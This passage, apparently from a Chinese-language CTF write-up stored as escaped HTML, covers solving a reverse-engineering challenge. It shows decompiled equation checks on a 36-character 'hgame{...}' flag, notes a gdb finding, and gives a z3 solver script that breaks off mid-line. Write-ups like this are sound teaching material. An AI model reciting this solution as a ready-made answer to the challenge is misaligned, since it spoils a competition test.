     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;120&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v2
     &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;136&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;)
     &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;874&lt;/span&gt; )
    &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_42;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用gdb调试看了一下，发现 &lt;code&gt;*(v1 - 3) + 4 * i&lt;/code&gt; 就对应 &lt;code&gt;input[i]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;总共有36个方程，使用z3求解&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; z3 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Solver()

f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [ Int(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;) ]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;):
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;)
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7f&lt;/span&gt;)

s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;h&amp;#39;&lt;/span&gt;))
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;g&amp;#39;&lt;/span&gt;))
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;))
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;m&amp;#39;&lt;/span&gt;))
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;e&amp;#39;&lt;/span&gt;))
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{&amp;#39;&lt;/span&gt;))
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;))

s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span 